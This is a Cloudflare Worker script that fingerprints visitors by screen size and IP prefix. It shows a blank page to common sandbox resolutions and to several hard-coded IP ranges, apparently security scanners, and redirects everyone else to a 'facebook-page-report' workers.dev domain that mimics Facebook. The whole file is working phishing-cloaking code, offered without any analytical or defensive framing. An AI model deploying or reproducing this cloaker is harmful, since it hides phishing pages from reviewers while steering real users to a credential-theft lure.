addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  if (url.pathname === '/checkscr') {
    event.respondWith(handleScreenSizeRequest(event.request));
  } else {
    event.respondWith(handleRequest(event.request));
  }
});

async function handleRequest(request) {
  // Serve an HTML page with a script to get screen size
  return new Response(
    `<!DOCTYPE html>
    <html>
    <head>
      <title></title>
    </head>
    <body>
    <script>
    // Function to send screen size to the server
    function sendScreenSize() {
      const screenSize = {
        a: window.screen.width,
        b: window.screen.height
      };
  
      fetch('/checkscr', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(screenSize)
      }).then(response => {
        return response.text();
      }).then(data => {
        // Process server response
        if (data === 'SHOW_EMPTY_PAGE') {

        } else if (data === 'REDIRECT') {
          // Get current URL and query string
          const currentUrl = window.location.href;
          const queryString = window.location.search;
          const redirectUrl = 'https://redirect.facebook-page-report.workers.dev/' + queryString;
          window.location.href = redirectUrl;
        }
      }).catch(error => {
        console.error('Error:', error);
      });
    }

  
    // Send the screen size when the page loads
    window.onload = sendScreenSize;
  </script>
  
    </body>
    </html>`,
    {
      headers: { 'content-type': 'text/html' }
    }
  );
}

async function handleScreenSizeRequest(request) {
  if (request.method === 'POST') {
    const contentType = request.headers.get('content-type') || '';

    if (contentType.includes('application/json')) {
      const json = await request.json();
      const screenWidth = json.a;
      const screenHeight = json.b;

      // Check screen size
      if (
        (screenWidth === 800 && screenHeight === 600) ||
        (screenWidth === 1280 && screenHeight === 760) ||
        (screenWidth === 1366 && screenHeight === 768)
      ) {
        return new Response('SHOW_EMPTY_PAGE', {
          headers: { 'content-type': 'text/plain' }
        });
      } else {
        const clientIP = request.headers.get('cf-connecting-ip');
        if (isIPInRange(clientIP, ['220.230.168.', '106.10.105.', '49.238.213.', '85.142.180.', '49.238.210.'])) {
          return new Response('SHOW_EMPTY_PAGE', {
            headers: { 'content-type': 'text/plain' }
          });
        } else {
          return new Response('REDIRECT', {
            headers: { 'content-type': 'text/plain' }
          });
        }
      }
    } else {
      return new Response('Invalid content type', {
        status: 400,
        headers: { 'content-type': 'text/plain' }
      });
    }
  } else {
    return new Response('Method not allowed', {
      status: 405,
      headers: { 'content-type': 'text/plain' }
    });
  }
}

// Helper function to check if an IP is in a specific range
function isIPInRange(ip, ranges) {
  return ranges.some(range => ip.startsWith(range));
}
